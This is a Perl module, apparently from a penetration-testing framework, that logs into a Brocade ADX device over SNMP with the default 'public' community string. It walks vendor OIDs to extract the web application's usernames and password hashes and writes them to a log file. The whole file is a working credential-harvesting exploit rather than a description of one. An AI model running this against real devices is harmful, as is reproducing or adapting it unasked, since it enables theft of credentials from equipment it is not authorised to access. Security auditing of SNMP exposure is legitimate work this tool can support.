# Brocade ADX Web Application password hash extract  
# 
######################################################
#                  PRAEDO Module #MA0022             #
#            Copyright (C) 2014    RAPID7.com        #
#              Deral Heiland    "@percent_x"         # 
######################################################
package MA0022;
use Net::SNMP  qw(oid_base_match);
sub MA0022
{

# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to extract Brocade ADX Web Application Password Hashes $TARGET : JOB MA0022**********\n";

# setup SNMP session

my $community = "public";
my ($session,$error)=Net::SNMP->session(-hostname=> $TARGET, -community =>$community);

if (!defined($session)) {
        printf("error: %s.\n", $error);
        exit 1;
}
print OUTFILE "-"x78,"\n";

# Extract username and password hashes from targeted devices

my $oid = ".1.3.6.1.4.1.1991.1.1.2.9.2.1.1";
my @args = ( -varbindlist =>  [$oid]);
while (defined($session->get_next_request(@args))) {
    $data = (keys(%{$session->var_bind_list}))[0];
    if (!oid_base_match($oid, $data)) { last; }
    printf OUTFILE ("SUCCESS:Brocade:UserName:          %s\n", $session->var_bind_list->{$data});
    @args = (-varbindlist => [$data]);
}
$oid = ".1.3.6.1.4.1.1991.1.1.2.9.2.1.2";
my @args = ( -varbindlist =>  [$oid]);
while (defined($session->get_next_request(@args))) {
    $data = (keys(%{$session->var_bind_list}))[0];
    if (!oid_base_match($oid, $data)) { last; }
    printf OUTFILE ("SUCCESS:Brocade:Password Hash:     %s\n", $session->var_bind_list->{$data});
    @args = (-varbindlist => [$data]);
}

print OUTFILE "-"x78,"\n";

# operation completed close out output files and snmp sessions
$session->close;
close(OUTFILE);

}
1;
